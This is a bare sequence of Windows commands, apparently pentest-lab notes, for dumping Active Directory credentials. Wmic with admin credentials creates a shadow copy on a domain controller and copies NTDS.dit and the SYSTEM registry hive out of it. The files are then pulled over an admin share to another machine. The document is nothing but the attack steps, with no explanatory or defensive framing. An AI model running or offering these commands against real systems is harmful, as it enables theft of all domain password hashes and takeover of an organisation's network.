	>wmic /node:dc /user:xxxx\admin /password:passwd process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
	>wmic /node:dc /user:P xxxx\admin /password: passwd process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
	>wmic /node:dc /user: xxxx\admin /password: passwd process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"
	>copy \\10.0.0.1\c$\temp\ntds.dit C:\temp
	PS C:\Users\test.PENTESTLAB> copy \\10.0.0.1\c$\temp\SYSTEM.hive C:\temp